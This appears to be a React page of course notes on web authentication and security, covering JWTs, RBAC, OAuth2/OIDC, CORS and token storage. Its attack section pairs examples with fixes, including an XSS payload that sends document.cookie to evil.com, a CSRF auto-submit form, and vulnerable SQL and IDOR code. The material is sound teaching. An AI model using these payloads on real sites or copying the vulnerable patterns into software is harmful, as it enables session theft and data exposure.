import DayNav from "../../components/DayNav";
import CodeBlock from "../../components/CodeBlock";
import { Link } from "react-router-dom";

export default function Notes() {
  return (
    <div className="page notes-page">
      <title>Day 16 Notes</title>
      <DayNav day="day16-auth-security" current="notes" />
      <header className="lecture-header">
        <p className="eyebrow">Week 4 · Day 16 · Notes</p>
        <h1>Authentication &amp; Security</h1>
        <p className="subtitle">Executive summary → full walkthrough</p>
      </header>

      <section id="executive-summary" className="exec-summary">
        <h2>Section 1 — Executive Summary</h2>
        <p>The essentials — what you must be able to do by the end of today:</p>
        <ul>
          <li>Explain the difference between authentication and authorization, and where each runs</li>
          <li>Implement a JWT login flow: issue a signed token, verify it in middleware, read the user off the request</li>
          <li>Enforce RBAC so a customer sees only their own orders and an associate only their store&apos;s</li>
          <li>Configure CORS correctly, and explain why a browser blocks a request the server never rejected</li>
          <li>Describe the OAuth2 / OIDC authorization-code flow in order, and what SSO adds on top</li>
          <li>Spot and fix an IDOR — an authorization check missing from the service layer</li>
        </ul>
        <p>
          Want more? <Link to="/week4/day16-auth-security/concepts">View all concepts?</Link>
        </p>
      </section>

      <section id="full-walkthrough">
        <h2>Section 2 — Full Walkthrough</h2>

        <h3>1. AuthN vs. AuthZ</h3>
        <table className="ref-table">
          <thead>
            <tr>
              <th></th>
              <th>Authentication (AuthN)</th>
              <th>Authorization (AuthZ)</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>Question</td>
              <td>Who are you?</td>
              <td>Are you allowed to do this?</td>
            </tr>
            <tr>
              <td>Runs</td>
              <td>Once, at login — then re-verified per request from the token</td>
              <td>On every protected operation</td>
            </tr>
            <tr>
              <td>Lives in</td>
              <td>Middleware (verify the token, attach the user)</td>
              <td>The service layer, where the resource is actually known</td>
            </tr>
            <tr>
              <td>Failure code</td>
              <td>
                <code>401 Unauthorized</code>
              </td>
              <td>
                <code>403 Forbidden</code>
              </td>
            </tr>
          </tbody>
        </table>
        <p className="callout">
          <code>401</code> means &quot;I don&apos;t know who you are&quot;; <code>403</code> means
          &quot;I know exactly who you are, and no.&quot;
        </p>

        <h3>2. Session-based auth (and why it doesn&apos;t scale)</h3>
        <p>Before JWT, the standard was a server-side session tied to a cookie:</p>
        <CodeBlock
          language="plaintext"
          code={`1. User logs in with email + password
2. Server creates a session record (sessionId -> { userId, ... }) in memory/Redis
3. Server responds with Set-Cookie: sessionId=abc123
4. Browser sends that cookie automatically on every later request
5. Server looks up abc123 in the session store to know who's asking`}
        />
        <table className="ref-table">
          <thead>
            <tr>
              <th></th>
              <th>Session-based</th>
              <th>JWT</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>Server stores</td>
              <td>Yes — one record per logged-in user</td>
              <td>Nothing — the token carries its own claims</td>
            </tr>
            <tr>
              <td>Scaling to many servers</td>
              <td>Needs a shared session store (Redis) or sticky sessions</td>
              <td>Any instance can verify a token on its own</td>
            </tr>
          </tbody>
        </table>
        <p className="callout">
          The session store becomes a shared dependency every server instance needs access to — that
          statefulness is the exact problem JWT is designed to remove.
        </p>

        <h3>3. The JWT workflow</h3>
        <p>
          A JWT is three base64url chunks joined by dots: <code>header.payload.signature</code>. The
          payload is readable by anyone — the signature only proves it wasn&apos;t <em>edited</em>.
        </p>
        <CodeBlock
          language="json"
          code={`{
  "sub": "412",
  "role": "store_associate",
  "storeId": 7,
  "iat": 1735689600,
  "exp": 1735693200
}`}
        />
        <p>
          The intuition that matters: the server never evaluates what the payload{" "}
          <em>means</em> — it only checks whether the token is <em>authentic</em>. That check is a
          calculation, not a lookup:
        </p>
        <CodeBlock
          language="plaintext"
          code={`header  = { "alg": "HS256", "typ": "JWT" }
payload = { "sub": "412", "role": "store_associate", ... }
secret  = known only to the server (JWT_SECRET) — never sent, never stored in the token

signature = HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)

token = base64url(header) + "." + base64url(payload) + "." + signature`}
        />
        <p>The same three ingredients run twice — once to issue the token, once to verify it:</p>
        <CodeBlock
          language="plaintext"
          code={`ISSUE  (login)
  client --- email + password -----------> server
  client <--- header.payload.signature ---- server   (server signs with its secret)

VERIFY  (every request after)
  client --- Authorization: Bearer <token> --> server
  server recomputes the signature from the token's own header + payload,
  using its OWN secret, and compares it to the signature already on the token

  match    -> token wasn't edited, and came from this server -> trust the payload
  mismatch -> reject: wrong secret, tampered payload, or expired`}
        />
        <p className="callout">
          The server never looks the token up anywhere. Validity is math it redoes on the spot, not a
          record it checks against — that&apos;s the entire meaning of &quot;stateless&quot;.
        </p>
        <div className="concept">
          <p className="concept-label">Concept</p>
          <ul>
            <li>
              JWTs are <strong>stateless</strong> — the server stores nothing, so any instance can
              verify any token. That is what makes them fit a load-balanced, multi-service backend.
            </li>
            <li>
              The cost of statelessness is that you <strong>can&apos;t revoke one</strong>. A stolen
              token stays valid until it expires — see Section 10 for the access/refresh split that
              manages that.
            </li>
            <li>
              Never put anything secret in the payload. It is encoded, not encrypted — anyone can
              read it.
            </li>
          </ul>
        </div>

        <h3>4. RBAC in the service layer</h3>
        <p>
          Four roles, and each one changes <em>which rows</em> a query is allowed to return — not
          just which endpoints are reachable:
        </p>
        <table className="ref-table">
          <thead>
            <tr>
              <th>Role</th>
              <th>Can see</th>
              <th>Can do</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>
                <code>customer</code>
              </td>
              <td>Only their own orders</td>
              <td>View status</td>
            </tr>
            <tr>
              <td>
                <code>store_associate</code>
              </td>
              <td>Only orders routed to their store</td>
              <td>Advance picking → packed → shipped</td>
            </tr>
            <tr>
              <td>
                <code>fulfillment_manager</code>
              </td>
              <td>Any order</td>
              <td>Re-route, override a routing decision</td>
            </tr>
            <tr>
              <td>
                <code>admin</code>
              </td>
              <td>Everything</td>
              <td>Everything</td>
            </tr>
          </tbody>
        </table>
        <CodeBlock
          language="typescript"
          code={`// A route-level role guard — necessary, but not sufficient on its own.
router.patch(
  "/orders/:id/reroute",
  requireAuth,
  requireRole("fulfillment_manager", "admin"),
  orderController.reroute
);`}
        />
        <div className="concept">
          <p className="concept-label">Concept</p>
          <ul>
            <li>
              A fixed list of roles is the simple case. Real authorization usually depends on more
              than role alone — resource ownership, group membership, plan tier, time of day. Whether
              that mix still counts as &quot;RBAC&quot; or is really ABAC (attribute-based) is a
              semantic argument, not a practical one.
            </li>
            <li>
              Production systems centralize that decision in a <strong>policy engine</strong> (e.g.
              Open Policy Agent, AWS Cedar, casbin) — one place that answers{" "}
              <code>can(user, action, resource)</code> for every check in the app, instead of
              hand-rolled <code>if</code> statements scattered across services.
            </li>
            <li>
              Some engines write those rules as a declarative policy file (OPA&apos;s Rego, Cedar);
              others are just a plain function. Either way it&apos;s the same shape: data describing
              who can do what, evaluated against the current user and resource.
            </li>
          </ul>
        </div>
        <p>
          Concretely, the &quot;more granular&quot; cases — one associate also allowed to issue
          refunds, a grant that doesn&apos;t fit any existing role — become attributes checked
          alongside the role, not new roles:
        </p>
        <CodeBlock
          language="typescript"
          code={`const policies = [
  { role: "customer", action: "read", resource: "order",
    allow: (user, order) => order.customerId === user.id },
  { role: "store_associate", action: "update", resource: "order",
    allow: (user, order) => order.storeId === user.storeId },
];

function can(user: AuthUser, action: string, order: Order) {
  const byRole = policies.some(
    (p) => p.role === user.role && p.action === action && p.allow(user, order)
  );
  // A one-off grant that doesn't fit the role, e.g. this associate can also refund:
  const byGrant = user.extraPermissions?.includes(\`\${action}:order\`);
  return byRole || Boolean(byGrant);
}`}
        />
        <p className="callout">
          Every checkpoint still calls the same <code>can(user, action, resource)</code> — the engine
          just gets more attributes to look at as the rules get more granular, instead of the app
          growing more <code>if</code> branches.
        </p>

        <h3>5. OAuth2 / OIDC / SSO</h3>
        <p>
          The enterprise split this project uses: customers sign in with Google (OAuth2/OIDC), staff
          sign in through corporate SSO. Both are the same authorization-code flow.
        </p>
        <CodeBlock
          language="plaintext"
          code={`1. App redirects the browser to the provider with client_id + redirect_uri + scope
2. User authenticates with the provider (your server never sees the password)
3. Provider redirects back to redirect_uri with a short-lived ?code=...
4. Server exchanges code + client_secret for tokens  [back channel, no browser]
5. Server receives: access_token (OAuth2)  +  id_token (OIDC, a JWT about the user)
6. Server issues its own session/JWT for the app`}
        />
        <div className="concept">
          <p className="concept-label">Concept</p>
          <ul>
            <li>
              <strong>OAuth2 is authorization</strong> — &quot;this app may act on your behalf.&quot;
              It answers what an app can access, not who you are.
            </li>
            <li>
              <strong>OIDC is a thin identity layer on top</strong> that adds the{" "}
              <code>id_token</code> — a JWT that actually says who the user is.
            </li>
            <li>
              <strong>SSO</strong> is the outcome, not a protocol: one identity provider backs many
              apps, so logging into one logs you into all of them.
            </li>
            <li>
              Step 4 happens server to server precisely so the <code>client_secret</code> never
              reaches the browser.
            </li>
          </ul>
        </div>

        <h3>6. Okta &amp; Auth0 — buying auth instead of building it</h3>
        <p>
          Most companies don&apos;t hand-roll this flow — they buy an identity provider and configure
          it instead.
        </p>
        <table className="ref-table">
          <thead>
            <tr>
              <th></th>
              <th>Okta</th>
              <th>Auth0</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>Typical user</td>
              <td>Your own employees</td>
              <td>Your product&apos;s customers</td>
            </tr>
            <tr>
              <td>Used for</td>
              <td>Workforce SSO into internal tools and SaaS apps</td>
              <td>Login/signup for the app you&apos;re building (CIAM)</td>
            </tr>
          </tbody>
        </table>
        <div className="concept">
          <p className="concept-label">Concept</p>
          <ul>
            <li>
              Both provide MFA, enterprise SSO (SAML/OIDC federation), social login, breached-password
              detection, and compliance auditing out of the box — implementing these correctly
              yourself is expensive and easy to get subtly wrong.
            </li>
            <li>Okta acquired Auth0 in 2021, but the two products stay aimed at different users.</li>
          </ul>
        </div>

        <h3>7. CORS</h3>
        <p>
          CORS is a <strong>browser</strong> rule, not a server one. The server happily responds;
          the browser refuses to hand the response to JavaScript unless the headers allow the
          calling origin. Curl and Postman are unaffected — which is why &quot;it works in Postman&quot;
          is the classic CORS symptom.
        </p>
        <CodeBlock
          language="typescript"
          code={`import cors from "cors";

app.use(
  cors({
    origin: ["https://ops.retailco.com", "https://orders.retailco.com"],
    credentials: true, // required if the browser sends cookies
    methods: ["GET", "POST", "PATCH", "DELETE"],
  })
);`}
        />
        <p className="callout">
          <code>origin: &quot;*&quot;</code> and <code>credentials: true</code> are illegal together
          — the browser rejects the combination outright.
        </p>

        <h3>8. Attack patterns worth knowing by name</h3>
        <table className="ref-table expandable-rows">
          <thead>
            <tr>
              <th>Attack</th>
              <th>What it does</th>
              <th>Fix</th>
            </tr>
          </thead>
          <tbody>
            <tr className="has-detail">
              <td>IDOR</td>
              <td>Change an ID in the URL to read someone else&apos;s data</td>
              <td>Ownership check in the service layer, or a policy engine (Section 4)</td>
            </tr>
            <tr>
              <td colSpan={3}>
                <details>
                  <summary>See the IDOR bug and its fix in code</summary>
                  <div className="answer">
                    <p>
                      The endpoint checks that you are <em>a</em> customer, but never that the order
                      is <em>yours</em> — change the ID in the URL and you read someone else&apos;s
                      order:
                    </p>
                    <CodeBlock
                      language="typescript"
                      good={[9, 10, 11, 12]}
                      bad={[3, 4]}
                      code={`export async function getOrder(orderId: number, user: AuthUser) {
  const order = await orderRepository.findById(orderId);
  if (!order) throw new OrderNotFoundError(orderId);
  return order; // any logged-in customer can read any order

  // The fix — scope the result to the caller, in the service layer:
  if (user.role === "customer" && order.customerId !== user.id) {
    throw new ForbiddenError();
  }
  if (user.role === "store_associate" && order.storeId !== user.storeId) {
    throw new ForbiddenError();
  }
  return order;
}`}
                    />
                    <p className="callout">
                      Throw <code>404</code> instead of <code>403</code> for a resource the caller
                      shouldn&apos;t know exists — a <code>403</code> confirms the order ID is real.
                      Hand-writing this check per service is exactly why IDOR is the most common
                      authorization bug; a policy engine replaces it with one{" "}
                      <code>can()</code> call every path goes through.
                    </p>
                  </div>
                </details>
              </td>
            </tr>
            <tr>
              <td>SQL injection</td>
              <td>User input becomes part of the SQL statement</td>
              <td>Parameterized queries — never string-concatenate SQL</td>
            </tr>
            <tr className="has-detail">
              <td>XSS</td>
              <td>Attacker&apos;s script runs in another user&apos;s browser</td>
              <td>Escape on output; React does this by default</td>
            </tr>
            <tr>
              <td colSpan={3}>
                <details>
                  <summary>See the XSS attack and its fix in code</summary>
                  <div className="answer">
                    <p>
                      A comment field stores raw HTML, and rendering it as HTML runs whatever script
                      it contains in every other visitor&apos;s browser:
                    </p>
                    <CodeBlock
                      language="typescript"
                      bad={[2]}
                      good={[7]}
                      code={`// Vulnerable — treats user input as markup
element.innerHTML = comment.text;
// if comment.text is: <img src=x onerror="fetch('//evil.com?c='+document.cookie)">
// ...that script now runs in every visitor's browser

// Fixed — treats it as text, never as markup
element.textContent = comment.text;`}
                    />
                    <p className="callout">
                      React escapes everything rendered as <code>{"{"}value{"}"}</code> by default —
                      this bug shows up when something bypasses that, like{" "}
                      <code>dangerouslySetInnerHTML</code>.
                    </p>
                  </div>
                </details>
              </td>
            </tr>
            <tr className="has-detail">
              <td>CSRF</td>
              <td>Another site makes an authenticated request using your cookie</td>
              <td>
                <code>SameSite</code> cookies, CSRF tokens (a non-cookie bearer token is immune)
              </td>
            </tr>
            <tr>
              <td colSpan={3}>
                <details>
                  <summary>See the CSRF attack and its fix in code</summary>
                  <div className="answer">
                    <p>
                      Any other open tab — even a malicious site — can submit a form to your API, and
                      the browser attaches your session cookie automatically:
                    </p>
                    <CodeBlock
                      language="plaintext"
                      code={`// hosted on evil.com, not your site
<form action="https://retailco.com/api/orders/9001/cancel" method="POST"></form>
<script>document.forms[0].submit()</script>
// the browser attaches retailco.com's session cookie to this request on its own`}
                    />
                    <p className="callout">
                      Fix: <code>SameSite=Strict</code> (or <code>Lax</code>) on the session cookie,
                      plus a CSRF token the form must echo back. A bearer token sent in a header
                      instead of a cookie sidesteps this entirely — the browser won&apos;t attach it
                      for you.
                    </p>
                  </div>
                </details>
              </td>
            </tr>
            <tr>
              <td>DDoS</td>
              <td>Flood the server with traffic so real users can&apos;t get through</td>
              <td>Rate limiting, a CDN/WAF in front, autoscaling</td>
            </tr>
            <tr>
              <td>Mass assignment</td>
              <td>
                Client sends <code>{"{"} role: &quot;admin&quot; {"}"}</code> and the ORM saves it
              </td>
              <td>Whitelist the fields you accept, never spread the body</td>
            </tr>
          </tbody>
        </table>
        <CodeBlock
          language="typescript"
          good={[5]}
          bad={[2]}
          code={`// SQL injection — the input becomes code
db.query(\`SELECT * FROM orders WHERE id = \${req.params.id}\`);

// Parameterized — the input can only ever be a value
db.query("SELECT * FROM orders WHERE id = $1", [req.params.id]);`}
        />
        <p className="callout">
          Never store sensitive data as plaintext — passwords, SSNs, and similar PII. Hash passwords
          with bcrypt or argon2 (slow by design, the opposite of a plain SHA), and encrypt other
          sensitive fields at rest.
        </p>

        <h3>9. Where to store the JWT</h3>
        <p>Storing the token is a separate decision from issuing it, and it&apos;s easy to get wrong:</p>
        <table className="ref-table">
          <thead>
            <tr>
              <th>Storage</th>
              <th>Readable by JS (XSS risk)</th>
              <th>Sent automatically</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>localStorage / sessionStorage</td>
              <td>Yes — any injected script can read and exfiltrate it</td>
              <td>No, attached manually</td>
            </tr>
            <tr>
              <td>In-memory (JS variable/state)</td>
              <td>Yes while running, but leaves nothing behind to steal at rest</td>
              <td>No, attached manually</td>
            </tr>
            <tr>
              <td>httpOnly cookie</td>
              <td>No — JavaScript can&apos;t read it at all</td>
              <td>Yes, automatically</td>
            </tr>
          </tbody>
        </table>
        <p className="callout">
          Best practice: keep the access token in memory, or in an httpOnly, Secure,{" "}
          <code>SameSite</code> cookie — never in <code>localStorage</code>/
          <code>sessionStorage</code>, where any XSS can read it directly.
        </p>
        <p>When the token lives in memory, the client attaches it to every request by hand:</p>
        <CodeBlock
          language="typescript"
          code={`fetch("/api/orders", {
  headers: { Authorization: \`Bearer \${accessToken}\` },
});`}
        />
        <div className="concept">
          <p className="concept-label">Concept</p>
          <ul>
            <li>
              An httpOnly cookie is sent automatically, so it needs the CSRF defenses from Section 8
              — a bearer token in memory doesn&apos;t, since no other site can attach it for you.
            </li>
          </ul>
        </div>

        <h3>10. Access tokens vs. refresh tokens</h3>
        <p>
          One short-lived token for API calls, one long-lived token whose only job is to mint new
          access tokens:
        </p>
        <CodeBlock
          language="plaintext"
          code={`1. Login returns access_token (~15 min) + refresh_token (days, stored more securely)
2. Client calls the API with access_token until it expires (401)
3. Client calls /auth/refresh with the refresh_token
4. Server verifies the refresh_token is still valid (not revoked), issues a new access_token
5. Client retries the original request with the new access_token`}
        />
        <div className="concept">
          <p className="concept-label">Concept</p>
          <ul>
            <li>
              A short-lived access token limits the damage window if it&apos;s ever stolen — it
              expires before an attacker can do much with it.
            </li>
            <li>
              The refresh token is long-lived, but it&apos;s checked against a server-side record and
              can be revoked — that&apos;s how you get &quot;log out everywhere&quot; despite JWTs
              being stateless.
            </li>
            <li>
              Rotating the refresh token on every use (issue a new one, invalidate the old) limits
              reuse if one ever leaks.
            </li>
          </ul>
        </div>
      </section>
    </div>
  );
}
